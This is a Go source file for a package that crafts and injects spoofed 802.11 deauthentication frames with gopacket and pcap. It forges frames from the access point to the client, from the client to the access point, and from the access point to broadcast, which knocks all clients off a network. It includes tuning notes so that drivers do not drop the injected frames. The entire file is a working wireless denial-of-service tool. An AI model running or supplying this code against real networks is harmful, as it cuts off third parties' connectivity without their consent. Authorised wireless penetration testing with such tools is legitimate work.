package deauth

import (
	"bytes"
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var broadcastMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

// Config holds deauth sender parameters.
type Config struct {
	Iface         string
	Packets       int           // bursts per target
	Interval      time.Duration // sleep between each send
	SkipBroadcast bool          // skip AP→broadcast packet
	SkipMAC       net.HardwareAddr
}

// Sender crafts and injects 802.11 deauth frames.
type Sender struct {
	cfg    Config
	handle *pcap.Handle
}

// New creates a Sender and opens a pcap handle for injection.
func New(cfg Config) (*Sender, error) {
	handle, err := pcap.OpenLive(cfg.Iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("open pcap handle: %w", err)
	}
	return &Sender{cfg: cfg, handle: handle}, nil
}

// Close releases the pcap handle.
func (s *Sender) Close() {
	if s.handle != nil {
		s.handle.Close()
	}
}

// Deauth sends the 3-packet deauth burst for a given AP→Client pair.
// Returns the number of packets actually sent.
func (s *Sender) Deauth(apMAC, clientMAC net.HardwareAddr) int {
	if s.shouldSkip(apMAC) || s.shouldSkip(clientMAC) {
		return 0
	}

	sent := 0
	for i := 0; i < s.cfg.Packets; i++ {
		// Packet 1: AP → Client
		if err := s.send(apMAC, clientMAC, apMAC); err == nil {
			sent++
		}
		s.sleep()

		// Packet 2: Client → AP
		if err := s.send(clientMAC, apMAC, apMAC); err == nil {
			sent++
		}
		s.sleep()

		// Packet 3: AP → Broadcast (deauth all clients on AP)
		if !s.cfg.SkipBroadcast {
			if err := s.send(apMAC, broadcastMAC, apMAC); err == nil {
				sent++
			}
			s.sleep()
		}
	}
	return sent
}

// send builds and injects a single deauth frame.
// addr1=dst, addr2=src, addr3=bssid
func (s *Sender) send(src, dst, bssid net.HardwareAddr) error {
	pkt, err := buildDeauthFrame(src, dst, bssid)
	if err != nil {
		return err
	}
	return s.handle.WritePacketData(pkt)
}

func (s *Sender) sleep() {
	if s.cfg.Interval > 0 {
		time.Sleep(s.cfg.Interval)
	}
}

func (s *Sender) shouldSkip(mac net.HardwareAddr) bool {
	return len(s.cfg.SkipMAC) == 6 && bytes.Equal(s.cfg.SkipMAC, mac)
}

// buildDeauthFrame serializes a Radiotap/Dot11/Deauth packet into raw bytes.
func buildDeauthFrame(src, dst, bssid net.HardwareAddr) ([]byte, error) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// Radiotap header with explicit rate field.
	// A bare 8-byte header (no present bits) causes many mac80211 drivers to
	// silently drop injected frames. Setting Rate tells the driver to use 1 Mbps
	// (value 2 in 500 kbps units) — the lowest, most robust injection rate.
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    2, // 1 Mbps (500 kbps units)
	}

	// 802.11 management frame header
	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtDeauthentication,
		DurationID:     314, // standard duration for deauth
		Address1:       dst,
		Address2:       src,
		Address3:       bssid,
		SequenceNumber: 0,
	}

	// Deauth reason: Class 3 frame received from nonassociated STA (reason code 8)
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11ReasonClass3FromNonAss,
	}

	err := gopacket.SerializeLayers(buf, opts, radiotap, dot11, deauth)
	if err != nil {
		return nil, fmt.Errorf("serialize deauth: %w", err)
	}
	return buf.Bytes(), nil
}
